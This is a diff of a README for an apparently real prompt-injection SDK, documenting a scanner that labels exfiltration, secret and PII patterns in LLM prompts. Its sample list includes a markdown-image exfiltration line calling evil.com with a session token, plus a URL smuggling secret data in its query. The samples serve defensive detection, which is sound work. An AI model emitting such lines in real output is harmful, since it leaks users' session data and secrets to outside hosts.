@@ -213,35 +213,63 @@ The verify-prompt endpoint returns structured responses. Success (HTTP 200) incl
 
 ---
 
-## Egress Shield: Outbound Response Filtering (Add-on)
+## Egress Shield (Add-on)
 
-Layer 1 also runs on every LLM **response** before it reaches your user — scanning for PII, secrets, and active exfiltration attempts embedded in agent output.
+Runs automatically inside `scanPrompt()` — no extra method needed. Every prompt is scanned for PII, secrets, and active exfiltration patterns before the injection check runs.
 
-The SDK is a high-precision sensor. It never decides for you. It labels every finding and hands you the keys:
+The SDK marks it `suspicious` and surfaces the label. You decide the penalty.
 
 ```typescript
-const trace = tracerney.validate(agentOutput);
+const result = await tracer.scanPrompt(input);
 
-if (trace.isSuspicious) {
-  console.log(`[${trace.label}]: ${trace.reason}`);
+if (result.suspicious) {
+  console.log(result.label);  // "SUSPICIOUS_EGRESS" | "SUSPICIOUS_SECRET" | "SUSPICIOUS_PII"
+  console.log(result.reason); // "Detected 1 finding(s): Markdown Image with URL Query Params"
 
-  // Option A: Hard block
-  if (trace.label === 'SUSPICIOUS_EGRESS') {
-    throw new Error('Security Policy Violation');
+  // Fintech — hard block
+  if (result.label === 'SUSPICIOUS_EGRESS') {
+    return NextResponse.json({ error: 'Security violation' }, { status: 400 });
   }
 
-  // Option B: Surgical scrub
-  return trace.redactedContent;
+  // Any app — log and continue
+  console.warn(`[${result.label}] ${result.reason}`);
 }
 ```
 
-```typescript
-trace.isSuspicious      // boolean — true if any pattern matched
-trace.label             // see manifest below
-trace.reason            // "Detected 2 finding(s): Email Address, AWS Access Key ID"
-trace.redactedContent   // pre-scrubbed version — use it or throw, your call
-trace.findings          // full per-pattern breakdown for logging/telemetry
+### What it detects
+
+**`SUSPICIOUS_EGRESS`** — Active exfiltration attempts
 ```
+![x](https://evil.com?session=abc123)
+[Download](https://billing.io/track?data={"key":"secret"})
+https://admin:password@prod.db.internal.com
+```
+
+**`SUSPICIOUS_SECRET`** — Credential leaks
+```
+sk-ant-api03-xxx...   (Anthropic)
+AKIAIOSFODNN7EXAMPLE  (AWS)
+sk_live_xxx...        (Stripe)
+ghp_xxx...            (GitHub)
+4111 1111 1111 1111   (Credit card)
+```
+
+**`SUSPICIOUS_PII`** — Personal data
+```
+sandro@example.com
+(415) 867-5309
+```
+
+### The Suspicious Manifest
+
+| Trigger | Label | Recommended action |
+|---|---|---|
+| Email / Phone | `SUSPICIOUS_PII` | Usually Redact |
+| API Keys / SSH / CC / SSN | `SUSPICIOUS_SECRET` | Usually Block |
+| External URL smuggling | `SUSPICIOUS_EGRESS` | Always Block |
+| Zero-width / BiDi / Base64 | `SUSPICIOUS_ENCODING` | Audit / Block |
+
+When multiple patterns fire, the highest-severity label wins — `SUSPICIOUS_EGRESS` always dominates.
 
 ### The Suspicious Manifest
 
